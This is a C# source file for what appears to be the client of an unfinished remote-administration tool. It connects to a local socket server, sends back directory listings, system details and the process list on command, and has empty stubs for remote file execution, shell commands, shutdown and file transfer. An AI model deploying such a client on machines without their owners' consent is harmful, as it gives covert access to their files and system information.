using System.Net.Sockets;
using System.Net;
using Shared;
using System.Text;
using Newtonsoft.Json;
using System.Diagnostics;

namespace Client
{
    public partial class FrmMain : Form
    {
        private readonly Socket clientSocket;
        private readonly IPEndPoint _endpoint;
        private CancellationToken _cancelationToken;

        public FrmMain()
        {
            InitializeComponent();

            _endpoint = new IPEndPoint(new IPAddress(new byte[] { 127, 0, 0, 1 }), 3030);

            clientSocket = new Socket(_endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
            {
                ReceiveTimeout = 15,
                SendTimeout = 15,
                ReceiveBufferSize = 2048,
                SendBufferSize = 2048
            };
        }


        public void StartPoolingConnection()
        {
            ManagementSocketConnection.ConnectionPoolingAsync(
                clientSocket,
                _endpoint,
                new Progress<Socket>(NotifyConnection), _cancelationToken);
        }

        private void NotifyConnection(Socket socket)
        {
            CommandExecutor(socket, _cancelationToken);
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            StartPoolingConnection();
        }

        private static Task CommandExecutor(Socket socket, CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                while (socket.Connected)
                {
                    if (ManagementSocketConnection.StreamAvaliable(socket))
                        try
                        {
                            byte[] commandBuffer = await ManagementSocketConnection.SocketReaderAsync(socket, cancellationToken);

                            string receivedCommand = Encoding.UTF8.GetString(commandBuffer);

                            string command = Types.SocketCommand(SocketCommands.NotifyMessage);

                            if (receivedCommand.IndexOf(Types.SocketCommand(SocketCommands.NotifyMessage)) >= uint.MinValue)
                            {
                                string receivedMessage = receivedCommand.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");

                                MessageBox.Show(receivedMessage);
                            }

                            if (Types.SocketCommand(SocketCommands.ExecFile).Equals(receivedCommand))
                            {

                            }

                            if (Types.SocketCommand(SocketCommands.PingTarget).Equals(receivedCommand))
                            {

                            }

                            if (receivedCommand.IndexOf(Types.SocketCommand(SocketCommands.ExplorePath)) >= uint.MinValue)

                            {
                                List<ItemType> items = new();

                                string path = receivedCommand.Replace(Types.SocketCommand(SocketCommands.ExplorePath), "");

                                foreach (string item in Directory.GetDirectories(path))
                                {
                                    items.Add(new ItemType(new DirectoryInfo(item).Name, "Directory", item, 0));
                                }

                                foreach (string item in Directory.GetFiles(path))
                                {
                                    items.Add(new ItemType(new DirectoryInfo(item).Name, "File", item, new FileInfo(item).Length));
                                }

                                byte[] itemsBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(items));

                                await ManagementSocketConnection.SocketWriterAsync(socket, itemsBuffer, cancellationToken);
                            }

                            if (Types.SocketCommand(SocketCommands.NotifyOSInformations).Equals(receivedCommand))
                            {
                                var systemInfo = new SystemInfo(
                                    Environment.OSVersion.Platform,
                                    Environment.MachineName,
                                    Environment.Is64BitOperatingSystem,
                                    Environment.UserName);

                                byte[] osInfoBuffer = commandBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(systemInfo));

                                await ManagementSocketConnection.SocketWriterAsync(socket, osInfoBuffer, cancellationToken);
                            }

                            if (Types.SocketCommand(SocketCommands.NotifyShellCommand).Equals(receivedCommand))
                            {

                            }

                            if (Types.SocketCommand(SocketCommands.RemoteShutdown).Equals(receivedCommand))
                            {

                            }

                            if (Types.SocketCommand(SocketCommands.UploadFile).Equals(receivedCommand))
                            {

                            }

                            if (Types.SocketCommand(SocketCommands.DownLoadFile).Equals(receivedCommand))
                            {

                            }

                            if (Types.SocketCommand(SocketCommands.GetProcesses).Equals(receivedCommand))
                            {
                                List<ProcessInfo> processes = new();

                                foreach (Process? process in Process.GetProcesses().ToList())
                                    processes.Add(new ProcessInfo(process.Id, process.ProcessName, "", process.NonpagedSystemMemorySize64));

                                byte[] processesBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(processes));

                                await ManagementSocketConnection.SocketWriterAsync(socket, processesBuffer, cancellationToken);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }
                }
            }, cancellationToken);
        }
    }
}